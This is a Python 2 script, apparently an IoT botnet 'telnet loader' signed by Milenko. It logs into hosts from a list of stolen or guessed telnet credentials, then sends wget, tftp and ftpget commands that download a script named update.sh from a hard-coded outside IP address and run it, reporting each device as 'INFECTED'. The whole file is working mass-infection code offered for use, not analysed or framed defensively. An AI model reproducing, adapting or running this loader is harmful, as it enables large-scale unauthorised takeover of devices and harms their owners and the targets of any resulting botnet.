#!/usr/bin/python
#Phaaaat hax telnet loader by Milenko

import sys, re, os, socket, time, select
from threading import Thread
from time import sleep

if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")

wget = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.10.68.196/update.sh -O update.sh; busybox wget http://185.10.68.196/update.sh -O update.sh; chmod 777 update.sh; sh update.sh; rm -rf update.sh" #wget command to send
tftp = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r update.sh -g 185.10.68.196; busybox tftp -r update.sh -g 185.10.68.196; chmod 777 update.sh; sh update.sh; rm -rf update.sh" #tftp command to send
ftpget = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.10.68.196 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 185.10.68.196 update.sh update.sh; chmod 777 update.sh; sh update.sh; rm -rf update.sh"

print "\033[31m"

print "S-S-SUUUPER fast telnet loader by Milenko"
print
#simply find and replace newlines to :: then a newline so every IP starts with ::. It will scan those for port 22 or whatever your skiddie heart desires </3
print "Reads ip:port user:pass and simply checks the IP for port 23."
print "Then sends the infect to it and saves the working telnets to \"working.txt\""
print "It is VERY fast and extremely efficient."
print "As it splits the file into equal chunks for each thread!"

threads = int(raw_input("Threads: "))

lines = open(sys.argv[1],"r").readlines()

global fh
fh = open("workingtelnet.txt","a+")

def chunkify(lst,n):
    return [ lst[i::n] for i in xrange(n) ]

running = 0

global loaded
loaded = 0
global rekt
rekt = []

def printStatus():
    global loaded
    while 1:
        sleep(30)
        print "\033[32m[\033[31m+\033[32m] Total eye pees loaded: " + str(loaded) + "\033[37m"
        if loaded >= 1000:
            print "Dayum u got sum phat hax brah :^}"


def readUntil(tn, advances, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        for advance in advances:
            if advance in buf: return buf
    return ""

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

def contains(data, array):
    for test in array:
        if test in data:
            return True
    return False

def infect(ip,username,password):
    global rekdevice
    global rekt
    global loaded
    global fh
    try:
        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tn.settimeout(1)
        tn.connect((ip, 23))
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(username + "\r\n")
            time.sleep(0.2)
        else:
            return
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(password + "\r\n")
            time.sleep(0.2)
        prompt = ''
        prompt += recvTimeout(tn, 40960)
        if "#" in prompt or "$" in prompt or "~" in prompt or ">" in prompt or "root@" in prompt:
            try:
                tn.send("ls /\r\n")
                time.sleep(1)
                timeout = 8
                buf = ''
                start_time = time.time()
                while time.time() - start_time < timeout:
                    buf += recvTimeout(tn, 40960)
                    time.sleep(0.1)
                    if "tmp" in buf and "unrecognized" not in buf:
                        tn.send(wget + "\r\n")
                        time.sleep(8)
                        tn.send(tftp + "\r\n")
                        time.sleep(8)
                        tn.send(ftpget + "\r\n")
                        time.sleep(8)
                        print "\033[32m[\033[31m+\033[32m] \033[33mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip)
                        tn.close()
                        return
            except:
                tn.close()
        else:
            #auth failed
            tn.close()
    except Exception as e:
        tn.close()

def check(chunk, fh):
    global running
    global rekt
    running += 1
    threadID = running
    for login in chunk:
        try:
            if login.split(":")[0] in rekt:
                continue
            if ":23 " in login:
                login = login.replace(":23 ", ":")
            if ":2323 " in login:
                login = login.replace(":2323 ", ":")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((login.split(":")[0], 23))
            s.close()
            infect(login.split(":")[0], login.split(":")[1], login.split(":")[2])
        except:
            pass
    print "\033[32m[\033[31m+\033[32m] Thread " + str(threadID) + " has finished scanning " + str(len(chunk)) + " IPs. Loaded: " + str(loaded)
    running -= 1

lines = map(lambda s: s.strip(), lines) # remove all newlines

chunks = chunkify(lines, threads) # make seperate chunk for each thread

print "STARTING SCAN AND LOAD!!!"

Thread(target = printStatus, args = ()).start()

for thread in xrange(0,threads):
    if thread >= 384:
        sleep(0.2)
    try:
        Thread(target = check, args = (chunks[thread], fh,)).start()
    except:
        pass
print "Scanning... Press enter 3 times to stop."

for i in range(0,3):
    raw_input()

fh.close()

os.kill(os.getpid(), 9)